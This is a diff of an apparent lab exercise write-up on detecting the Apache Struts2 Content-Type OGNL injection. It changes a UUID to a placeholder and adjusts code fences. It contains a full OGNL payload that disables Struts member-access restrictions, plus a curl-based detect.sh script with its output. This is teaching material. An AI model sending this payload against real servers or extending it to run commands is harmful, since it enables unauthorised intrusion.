@@ -1,7 +1,5 @@
 
-To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (03031824-841d-47c6-9cec-5144b3087f28) as first argument:
-
-/usr/local/bin/score 03031824-841d-47c6-9cec-5144b3087f28
+/usr/local/bin/score UUID
 
 You can access this exercise using the following URL: http://ptl-8c1ff287-f36d3391.libcurl.so/. 
 
@@ -22,15 +20,21 @@ We can easily tweak this payload to allow us to detect the vulnerability without
 
 %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}
 
+```
+
+``` sh
 $ cat detect.sh 
+```
 
 ``` sh
 curl --header "Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}" $1 
 
 ```
 
+``` sh
 $ sh detect.sh [SERVER]
-
+```
+``` html
 test
 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
